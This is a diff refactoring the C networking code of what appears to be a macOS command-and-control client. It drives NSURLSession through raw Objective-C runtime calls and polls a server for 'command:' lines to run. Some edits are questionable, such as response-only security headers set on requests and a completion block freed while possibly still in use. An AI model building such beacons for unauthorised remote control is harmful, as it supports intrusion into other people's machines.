@@ -6,28 +6,35 @@
 #include <string.h>
 #include <unistd.h>
 #include "client.h"
-#include "protocol.h"
+
+#define HTTP_TIMEOUT_SECONDS 5
+#define MAX_URL_LENGTH 512
+#define HTTP_STATUS_OK 200
+#define HTTP_STATUS_NO_CONTENT 204
+#define BLOCK_HAS_COPY_DISPOSE (1 << 25)
+#define BLOCK_HAS_DESCRIPTOR (1 << 26)
+#define MAX_RETRIES 3
+#define RETRY_DELAY_MS 500
 
 typedef struct {
   http_response_t* resp;
   dispatch_semaphore_t semaphore;
+  bool completed;
+  NetworkError error;
 } RequestContext;
 
-#ifdef DEBUG
-#include <stdio.h>
-#define DEBUG_LOG(...)          \
-  fprintf(stderr, "[DEBUG] ");  \
-  fprintf(stderr, __VA_ARGS__); \
-  fprintf(stderr, "\n")
-#else
-#define DEBUG_LOG(...) ((void)0)
-#endif
-
-typedef long NSInteger;
-typedef unsigned long NSUInteger;
-
-typedef void (*CompletionHandler)(RTKInstance data, RTKInstance response,
-                                  RTKInstance error, void* context);
+typedef struct {
+  RTKContext* ctx;
+  RTKInstance urlString;
+  RTKInstance url;
+  RTKInstance request;
+  RTKInstance contentTypeKey;
+  RTKInstance contentTypeValue;
+  RTKInstance dataTask;
+  RTKInstance completionHandler;
+  dispatch_semaphore_t semaphore;
+  RequestContext* reqContext;
+} CleanupContext;
 
 struct BlockDescriptor {
   unsigned long reserved;
@@ -45,6 +52,75 @@ struct Block_literal {
   RequestContext* context;
 };
 
+#ifdef DEBUG
+typedef struct {
+  NetworkError code;
+  const char* message;
+} ErrorMessage;
+
+static const ErrorMessage error_messages[] = {
+    {NETWORK_SUCCESS, "Success"},
+    {NETWORK_ERROR_INVALID_ARGS, "Invalid arguments"},
+    {NETWORK_ERROR_MEMORY, "Memory allocation failed"},
+    {NETWORK_ERROR_URL_CREATE, "Failed to create URL"},
+    {NETWORK_ERROR_REQUEST_CREATE, "Failed to create request"},
+    {NETWORK_ERROR_TIMEOUT, "Request timed out"},
+    {NETWORK_ERROR_SEND, "Failed to send request"},
+    {NETWORK_ERROR_RESPONSE, "Invalid response"},
+};
+
+#include <stdio.h>
+#define DEBUG_LOG(...)            \
+  do {                            \
+    fprintf(stderr, "[DEBUG] ");  \
+    fprintf(stderr, __VA_ARGS__); \
+    fprintf(stderr, "\n");        \
+  } while (0)
+
+static void log_error(NetworkError error) {
+  for (size_t i = 0; i < sizeof(error_messages) / sizeof(error_messages[0]);
+       i++) {
+    if (error_messages[i].code == error) {
+      DEBUG_LOG("Network error: %s", error_messages[i].message);
+      return;
+    }
+  }
+  DEBUG_LOG("Unknown error: %d", error);
+}
+#else
+#define DEBUG_LOG(...) ((void)0)
+#define log_error(e) ((void)0)
+#endif
+
+static void cleanup_resources(CleanupContext* cleanup) {
+  if (!cleanup)
+    return;
+
+  if (cleanup->ctx) {
+    if (cleanup->urlString)
+      rtk_release(cleanup->ctx, cleanup->urlString);
+    if (cleanup->url)
+      rtk_release(cleanup->ctx, cleanup->url);
+    if (cleanup->contentTypeKey)
+      rtk_release(cleanup->ctx, cleanup->contentTypeKey);
+    if (cleanup->contentTypeValue)
+      rtk_release(cleanup->ctx, cleanup->contentTypeValue);
+    if (cleanup->request)
+      rtk_release(cleanup->ctx, cleanup->request);
+    if (cleanup->dataTask)
+      rtk_release(cleanup->ctx, cleanup->dataTask);
+    if (cleanup->completionHandler)
+      free(cleanup->completionHandler);
+  }
+
+  if (cleanup->semaphore)
+    dispatch_release(cleanup->semaphore);
+  if (cleanup->reqContext)
+    free(cleanup->reqContext);
+
+  memset(cleanup, 0, sizeof(*cleanup));
+}
+
 static void completion_invoke(void* block, id data, id response, id error) {
   struct Block_literal* literal = block;
   RequestContext* reqContext = literal->context;
@@ -57,19 +133,24 @@ static void completion_invoke(void* block, id data, id response, id error) {
   if (error) {
     DEBUG_LOG("Request error occurred");
     resp->status_code = 0;
+    reqContext->error = NETWORK_ERROR_SEND;
   } else if (response) {
-    resp->status_code = (int)((NSInteger(*)(id, SEL))objc_msgSend)(
-        response, sel_registerName("statusCode"));
+    typedef int (*msg_send_int)(id, SEL);
+    msg_send_int msgSend = (msg_send_int)objc_msgSend;
+    resp->status_code = msgSend(response, sel_registerName("statusCode"));
 
     if (data) {
-      NSUInteger length = ((NSUInteger(*)(id, SEL))objc_msgSend)(
-          data, sel_registerName("length"));
+      typedef unsigned long (*msg_send_length)(id, SEL);
+      msg_send_length lengthSend = (msg_send_length)objc_msgSend;
+      unsigned long length = lengthSend(data, sel_registerName("length"));
 
       if (length > 0) {
         resp->data = malloc(length + 1);
         if (resp->data) {
-          const void* bytes = ((const void* (*)(id, SEL))objc_msgSend)(
-              data, sel_registerName("bytes"));
+          typedef const void* (*msg_send_bytes)(id, SEL);
+          msg_send_bytes bytesSend = (msg_send_bytes)objc_msgSend;
+          const void* bytes = bytesSend(data, sel_registerName("bytes"));
+
           memcpy(resp->data, bytes, length);
           resp->data[length] = '\0';
           resp->length = length;
@@ -79,16 +160,29 @@ static void completion_invoke(void* block, id data, id response, id error) {
     }
   }
 
+  reqContext->completed = true;
   dispatch_semaphore_signal(reqContext->semaphore);
+}
+
+static void block_dispose(void* block) {
+  struct Block_literal* literal = block;
+  literal->context = NULL;
+}
+
+static void block_copy(void* dst, void* src) {
+  memcpy(dst, src, sizeof(struct Block_literal));
 }
 
 static RTKInstance create_completion_handler(RequestContext* reqContext) {
   static struct BlockDescriptor descriptor = {0, sizeof(struct Block_literal),
-                                              NULL, NULL};
+                                              block_copy, block_dispose};
 
   struct Block_literal* block = malloc(sizeof(struct Block_literal));
-  block->isa = objc_getClass("NSBlock");  // Or _NSConcreteGlobalBlock
-  block->flags = (1 << 25);               // BLOCK_HAS_DESCRIPTOR
+  if (!block)
+    return NULL;
+
+  block->isa = objc_getClass("NSBlock");
+  block->flags = BLOCK_HAS_COPY_DISPOSE | BLOCK_HAS_DESCRIPTOR;
   block->reserved = 0;
   block->invoke = completion_invoke;
   block->descriptor = &descriptor;
@@ -97,142 +191,159 @@ static RTKInstance create_completion_handler(RequestContext* reqContext) {
   return (RTKInstance)block;
 }
 
-bool send_http_request(ClientContext* ctx, const http_request_t* req,
-                       http_response_t* resp) {
-  DEBUG_LOG("Starting HTTP request to %s", req->url_path);
+static void add_security_headers(RTKContext* ctx, RTKInstance request) {
+  static const char* security_headers[][2] = {
+      {"X-Content-Type-Options", "nosniff"},
+      {"X-Frame-Options", "DENY"},
+      {"Strict-Transport-Security", "max-age=31536000; includeSubDomains"},
+  };
 
-  // Create full URL string
-  char url_str[512];
-  snprintf(url_str, sizeof(url_str), "http://%s:%d%s", ctx->config.server_host,
-           ctx->config.server_port, req->url_path);
+  for (size_t i = 0; i < sizeof(security_headers) / sizeof(security_headers[0]);
+       i++) {
+    RTKInstance key = rtk_string_create(ctx, security_headers[i][0]);
+    RTKInstance value = rtk_string_create(ctx, security_headers[i][1]);
 
-  DEBUG_LOG("URL string: %s", url_str);
+    if (key && value) {
+      rtk_msg_send_2obj(ctx, request, "setValue:forHTTPHeaderField:", value,
+                        key);
+    }
 
-  // Initialize response if provided
+    if (key)
+      rtk_release(ctx, key);
+    if (value)
+      rtk_release(ctx, value);
+  }
+}
+
+NetworkError send_http_request(ClientContext* ctx, const http_request_t* req,
+                               http_response_t* resp) {
+  if (!ctx || !req)
+    return NETWORK_ERROR_INVALID_ARGS;
+
+  CleanupContext cleanup = {0};
+  cleanup.ctx = ctx;
+
+  char url_str[MAX_URL_LENGTH];
+  if (snprintf(url_str, sizeof(url_str), "http://%s:%d%s",
+               ctx->config.server_host, ctx->config.server_port,
+               req->url_path) >= sizeof(url_str)) {
+    return NETWORK_ERROR_INVALID_ARGS;
+  }
+
   if (resp) {
-    resp->data = NULL;
-    resp->length = 0;
-    resp->status_code = 0;
+    memset(resp, 0, sizeof(*resp));
   }
 
-  // Create URL
-  RTKInstance urlString = rtk_string_create(ctx->rtk, url_str);
-  if (!urlString) {
-    DEBUG_LOG("Failed to create URL string");
-    return false;
+  cleanup.urlString = rtk_string_create(ctx->rtk, url_str);
+  if (!cleanup.urlString) {
+    log_error(NETWORK_ERROR_URL_CREATE);
+    return NETWORK_ERROR_URL_CREATE;
   }
 
-  RTKInstance url = rtk_msg_send_obj(ctx->rtk, rtk_get_class(ctx->rtk, "NSURL"),
-                                     "URLWithString:", urlString);
-  if (!url) {
-    DEBUG_LOG("Failed to create NSURL");
-    rtk_release(ctx->rtk, urlString);
-    return false;
+  cleanup.url = rtk_msg_send_obj(ctx->rtk, rtk_get_class(ctx->rtk, "NSURL"),
+                                 "URLWithString:", cleanup.urlString);
+
+  if (!cleanup.url) {
+    cleanup_resources(&cleanup);
+    return NETWORK_ERROR_URL_CREATE;
   }
 
-  // Create request
-  RTKInstance request =
+  cleanup.request =
       rtk_msg_send_obj(ctx->rtk, rtk_get_class(ctx->rtk, "NSMutableURLRequest"),
-                       "requestWithURL:", url);
-  if (!request) {
-    DEBUG_LOG("Failed to create request");
-    rtk_release(ctx->rtk, urlString);
-    rtk_release(ctx->rtk, url);
-    return false;
+                       "requestWithURL:", cleanup.url);
+
+  if (!cleanup.request) {
+    cleanup_resources(&cleanup);
+    return NETWORK_ERROR_REQUEST_CREATE;
   }
 
-  // Set HTTP method and body if provided
   if (req->body) {
     RTKInstance postMethod = rtk_string_create(ctx->rtk, "POST");
-    rtk_msg_send_obj(ctx->rtk, request, "setHTTPMethod:", postMethod);
+    rtk_msg_send_obj(ctx->rtk, cleanup.request, "setHTTPMethod:", postMethod);
 
     RTKInstance bodyData =
         rtk_data_create(ctx->rtk, (const uint8_t*)req->body, req->body_length);
+
     if (bodyData) {
-      rtk_msg_send_obj(ctx->rtk, request, "setHTTPBody:", bodyData);
+      rtk_msg_send_obj(ctx->rtk, cleanup.request, "setHTTPBody:", bodyData);
       rtk_release(ctx->rtk, bodyData);
     }
     rtk_release(ctx->rtk, postMethod);
   }
 
-  // Set headers
-  RTKInstance contentTypeKey = rtk_string_create(ctx->rtk, "Content-Type");
-  RTKInstance contentTypeValue = rtk_string_create(ctx->rtk, "text/plain");
-  rtk_msg_send_2obj(ctx->rtk, request,
-                    "setValue:forHTTPHeaderField:", contentTypeValue,
-                    contentTypeKey);
+  cleanup.contentTypeKey = rtk_string_create(ctx->rtk, "Content-Type");
+  cleanup.contentTypeValue = rtk_string_create(ctx->rtk, "text/plain");
+  rtk_msg_send_2obj(ctx->rtk, cleanup.request,
+                    "setValue:forHTTPHeaderField:", cleanup.contentTypeValue,
+                    cleanup.contentTypeKey);
 
-  // Get shared session
+  add_security_headers(ctx->rtk, cleanup.request);
+
   RTKInstance session = rtk_msg_send_class(
       ctx->rtk, rtk_get_class(ctx->rtk, "NSURLSession"), "sharedSession");
+
   if (!session) {
-    DEBUG_LOG("Failed to get shared session");
-    return false;
+    cleanup_resources(&cleanup);
+    return NETWORK_ERROR_REQUEST_CREATE;
   }
 
-  dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
-  if (!semaphore) {
-    DEBUG_LOG("Failed to create semaphore");
-    return false;
+  cleanup.semaphore = dispatch_semaphore_create(0);
+  if (!cleanup.semaphore) {
+    cleanup_resources(&cleanup);
+    return NETWORK_ERROR_MEMORY;
   }
 
-  RequestContext* reqContext = malloc(sizeof(RequestContext));
-  if (!reqContext) {
-    DEBUG_LOG("Failed to allocate request context");
-    dispatch_release(semaphore);
-    return false;
+  cleanup.reqContext = malloc(sizeof(RequestContext));
+  if (!cleanup.reqContext) {
+    cleanup_resources(&cleanup);
+    return NETWORK_ERROR_MEMORY;
   }
 
-  reqContext->resp = resp;
-  reqContext->semaphore = semaphore;
+  cleanup.reqContext->resp = resp;
+  cleanup.reqContext->semaphore = cleanup.semaphore;
+  cleanup.reqContext->completed = false;
+  cleanup.reqContext->error = NETWORK_SUCCESS;
 
-  RTKInstance completionHandler = create_completion_handler(reqContext);
-  if (!completionHandler) {
-    DEBUG_LOG("Failed to create completion handler");
-    free(reqContext);
-    dispatch_release(semaphore);
-    return false;
+  cleanup.completionHandler = create_completion_handler(cleanup.reqContext);
+  if (!cleanup.completionHandler) {
+    cleanup_resources(&cleanup);
+    return NETWORK_ERROR_MEMORY;
   }
 
-  RTKInstance dataTask = ((id(*)(id, SEL, id, id))objc_msgSend)(
+  cleanup.dataTask = ((id(*)(id, SEL, id, id))objc_msgSend)(
       session, sel_registerName("dataTaskWithRequest:completionHandler:"),
-      request, completionHandler);
+      cleanup.request, cleanup.completionHandler);
 
-  if (!dataTask) {
-    DEBUG_LOG("Failed to create data task");
-    free(completionHandler);
-    free(reqContext);
-    dispatch_release(semaphore);
-    return false;
+  if (!cleanup.dataTask) {
+    cleanup_resources(&cleanup);
+    return NETWORK_ERROR_REQUEST_CREATE;
   }
 
-  rtk_msg_send_empty(ctx->rtk, dataTask, "resume");
+  rtk_msg_send_empty(ctx->rtk, cleanup.dataTask, "resume");
 
   long result = dispatch_semaphore_wait(
-      semaphore, dispatch_time(DISPATCH_TIME_NOW, 5LL * NSEC_PER_SEC));
-  bool requestSuccess = (result == 0);
+      cleanup.semaphore,
+      dispatch_time(DISPATCH_TIME_NOW, HTTP_TIMEOUT_SECONDS * NSEC_PER_SEC));
 
-  if (!requestSuccess) {
-    DEBUG_LOG("Request timed out");
+  NetworkError error = NETWORK_SUCCESS;
+
+  if (result != 0) {
+    rtk_msg_send_empty(ctx->rtk, cleanup.dataTask, "cancel");
+    error = NETWORK_ERROR_TIMEOUT;
+  } else if (!cleanup.reqContext->completed) {
+    error = NETWORK_ERROR_RESPONSE;
+  } else {
+    error = cleanup.reqContext->error;
   }
 
-  rtk_release(ctx->rtk, urlString);
-  rtk_release(ctx->rtk, url);
-  rtk_release(ctx->rtk, contentTypeKey);
-  rtk_release(ctx->rtk, contentTypeValue);
-  rtk_release(ctx->rtk, request);
-  rtk_release(ctx->rtk, dataTask);
-  rtk_release(ctx->rtk, completionHandler);
-  dispatch_release(semaphore);
-  free(reqContext);
+  cleanup_resources(&cleanup);
 
-  if (resp && resp->status_code == 0) {
-    DEBUG_LOG("Request failed or timed out");
-    return false;
+  if (error != NETWORK_SUCCESS) {
+    log_error(error);
+    return error;
   }
 
-  DEBUG_LOG("Request completed successfully");
-  return requestSuccess;
+  return NETWORK_SUCCESS;
 }
 
 void free_http_response(http_response_t* resp) {
@@ -243,23 +354,25 @@ void free_http_response(http_response_t* resp) {
     resp->data = NULL;
   }
   resp->length = 0;
+  resp->status_code = 0;
 }
 
 char* get_command_from_response(ClientContext* ctx, const http_request_t* req) {
   http_response_t response = {0};
 
-  if (!send_http_request(ctx, req, &response)) {
+  NetworkError error = send_http_request(ctx, req, &response);
+  if (error != NETWORK_SUCCESS) {
     DEBUG_LOG("Failed to send command poll request");
     return NULL;
   }
 
-  if (response.status_code == 204) {  // No Content
+  if (response.status_code == HTTP_STATUS_NO_CONTENT) {
     DEBUG_LOG("No pending commands (status 204)");
     free_http_response(&response);
     return NULL;
   }
 
-  if (response.status_code != 200 || !response.data) {
+  if (response.status_code != HTTP_STATUS_OK || !response.data) {
     DEBUG_LOG("Invalid response: status=%d", response.status_code);
     free_http_response(&response);
     return NULL;
@@ -267,11 +380,14 @@ char* get_command_from_response(ClientContext* ctx, const http_request_t* req) {
 
   DEBUG_LOG("Parsing response: %s", response.data);
 
-  // Parse our protocol format response
   char* command = NULL;
   char* lines = strdup(response.data);
-  char* line = strtok(lines, "\n");
+  if (!lines) {
+    free_http_response(&response);
+    return NULL;
+  }
 
+  char* line = strtok(lines, "\n");
   while (line) {
     if (strncmp(line, "command: ", 9) == 0) {
       command = strdup(line + 9);
@@ -286,5 +402,6 @@ char* get_command_from_response(ClientContext* ctx, const http_request_t* req) {
   if (command) {
     DEBUG_LOG("Found command: %s", command);
   }
+
   return command;
 }
